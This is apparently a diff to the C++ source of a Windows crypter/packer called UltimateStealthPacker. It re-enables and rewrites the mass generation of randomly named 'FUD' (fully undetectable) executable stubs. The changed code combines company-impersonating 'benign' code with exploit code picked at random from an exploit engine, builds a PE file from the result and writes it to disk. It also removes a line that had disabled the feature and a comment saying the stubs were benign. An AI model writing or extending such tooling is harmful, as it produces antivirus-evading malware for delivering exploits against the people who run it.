@@ -2485,7 +2485,7 @@ HWND g_hModeGroup, g_hModeStubRadio, g_hModePackRadio, g_hModeMassRadio;
 HWND g_hExploitCombo;
 UltimateStealthPacker g_packer;
 
-// Mass generation function
+// Mass generation function using internal PE generator
 static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
     int totalCount = *(int*)lpParam;
     
@@ -2504,9 +2504,6 @@ static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
         // Generate unique output filename
         std::string outputPath = "FUD_Stub_" + std::to_string(i + 1) + "_" + 
                                 g_packer.randomEngine.generateRandomName(8) + ".exe";
-        
-        // Create a dummy input file (we're only generating benign stubs)
-        std::string dummyInput = "C:\\Windows\\System32\\notepad.exe";
         
         // Update status
         std::wstring statusText = L"Generating FUD stub " + std::to_wstring(i + 1) + 
@@ -2531,13 +2528,34 @@ static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
             exploitType = (ExploitDeliveryType)(g_packer.randomEngine.generateRandomDWORD() % 6);
         }
         
-        // Generate the FUD stub with potential exploits
-        bool success = g_packer.createBenignStubWithExploits(dummyInput, outputPath, safeCompanyIndex, safeCertIndex, architecture, exploitType);
+        // Generate benign code for the stub
+        std::string companyName = g_packer.getCompanyProfiles()[safeCompanyIndex].name;
+        std::string benignCode = g_packer.benignBehavior.generateBenignCode(companyName);
         
-        if (!success) {
-            SetWindowTextW(g_hStatusText, L"Generation failed! Check compiler setup.");
+        // Add exploit code if selected
+        if (exploitType != EXPLOIT_NONE) {
+            std::vector<uint8_t> dummyPayload = {0x4D, 0x5A}; // Just MZ header for exploit generation
+            std::string exploitCode = g_packer.exploitEngine.generateExploit(exploitType, dummyPayload);
+            benignCode += "\n\n" + exploitCode;
+        }
+        
+        // Use internal PE generator with tiny_loader.h
+        std::vector<uint8_t> executableData = g_packer.embeddedCompiler.generateMinimalPEExecutable(benignCode);
+        
+        if (executableData.empty()) {
+            SetWindowTextW(g_hStatusText, L"Generation failed! Internal PE generator error.");
             break;
         }
+        
+        // Write the executable to file
+        std::ofstream outFile(outputPath, std::ios::binary);
+        if (!outFile.is_open()) {
+            SetWindowTextW(g_hStatusText, L"Generation failed! Cannot write output file.");
+            break;
+        }
+        
+        outFile.write(reinterpret_cast<const char*>(executableData.data()), executableData.size());
+        outFile.close();
         
         // Small delay to prevent system overload
         Sleep(100);
@@ -2545,7 +2563,7 @@ static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
     
     // Generation complete
     SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
-    SetWindowTextW(g_hStatusText, L"Mass generation completed! All FUD stubs created.");
+    SetWindowTextW(g_hStatusText, L"Mass generation completed! All FUD stubs created using internal PE generator.");
     
     // Re-enable buttons
     EnableWindow(g_hMassGenerateBtn, TRUE);
@@ -2562,10 +2580,6 @@ static void SetWindowTextAnsi(HWND hwnd, const char* text) {
 
 static void startMassGeneration() {
     if (g_massGenerationActive) return;
-    
-    // Disable mass generation temporarily to prevent interference
-    SetWindowTextW(g_hStatusText, L"Mass generation temporarily disabled for stability.");
-    return;
     
     // Get count from edit box
     wchar_t countBuffer[10] = {0};
